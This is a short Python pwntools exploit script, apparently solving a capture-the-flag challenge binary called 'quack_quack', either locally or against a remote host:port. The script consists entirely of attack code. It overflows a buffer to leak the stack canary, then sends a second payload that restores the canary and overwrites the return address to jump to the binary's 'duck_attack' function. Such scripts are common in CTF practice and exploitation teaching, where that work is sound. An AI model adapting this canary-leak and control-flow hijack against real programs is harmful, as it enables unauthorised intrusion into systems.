#!/usr/bin/env python3

from pwn import context, p64, remote, sys, u64


context.binary = 'quack_quack'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, port)


io = get_process()

pos = 113 - 0x20 + 8

payload = b'A' * pos + b'Quack Quack '
io.sendafter(b'> ', payload)
io.recvuntil(b'Quack Quack ')
canary = u64(b'\0' + io.recv(7))
io.success(f'Canary: {hex(canary)}')

payload  = b'A' * (112 - 0x20 + 8)
payload += p64(canary)
payload += b'A' * 8
payload += p64(context.binary.sym.duck_attack)

io.sendafter(b'> ', payload)

io.success(io.recvS())
